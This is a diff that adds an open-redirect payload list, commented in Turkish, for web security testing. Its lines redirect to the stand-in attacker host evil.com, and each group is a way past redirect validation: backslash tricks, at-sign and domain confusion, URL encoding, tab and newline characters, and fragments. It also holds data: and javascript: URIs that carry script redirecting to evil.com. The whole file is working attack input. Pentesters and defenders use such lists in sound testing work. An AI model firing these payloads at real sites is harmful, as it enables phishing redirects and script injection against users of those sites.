@@ -1,0 +1,44 @@
+# open redirect test payloadları
+# temel yönlendirmeler
+https://evil.com
+http://evil.com
+//evil.com
+///evil.com
+
+# protocol-relative
+//evil.com/%2f..
+///evil.com/%2f..
+////evil.com/%2f..
+
+# backslash bypass
+/\evil.com
+\/evil.com
+/\/evil.com
+
+# at sign bypass
+https://hedef.com@evil.com
+//hedef.com@evil.com
+
+# encoding bypass
+https://evil.com%2f%2f
+https:%2f%2fevil.com
+https:evil.com
+%68%74%74%70%73%3a%2f%2fevil.com
+
+# tab ve newline bypass
+//evil%09.com
+//evil%0d.com
+//evil%0a.com
+
+# domain konfüzyon
+https://evil.com?.hedef.com
+https://evil.com/.hedef.com
+https://evil.com\@hedef.com
+
+# data uri
+data:text/html,<script>document.location='https://evil.com'</script>
+javascript:document.location='https://evil.com'
+
+# url fragment
+//evil.com#.hedef.com
+//evil.com?.hedef.com#.hedef.com
